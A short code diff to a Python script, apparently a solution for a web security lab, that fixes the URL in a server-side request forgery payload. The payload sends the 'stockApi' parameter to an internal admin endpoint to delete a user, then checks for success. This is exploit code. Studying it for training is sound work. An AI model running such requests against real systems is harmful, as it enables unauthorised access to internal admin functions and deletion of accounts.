@@ -27,7 +27,7 @@ def delete_user(url, admin_ip_address):
     r = requests.post(url + check_stock_path, data=param, verify=False, proxies=proxies)
 
     # Check if user was deleleted
-    check_admin_url_ssrf_payload = 'http://192/168.0.%s:8080/admin' % admin_ip_address
+    check_admin_url_ssrf_payload = 'http://%s:8080/admin' % admin_ip_address
     param2 = {'stockApi' : check_admin_url_ssrf_payload}
     r = requests.post(url + check_stock_path, data=param2, verify=False, proxies=proxies)
     if 'User deleted successfully' in r.text:
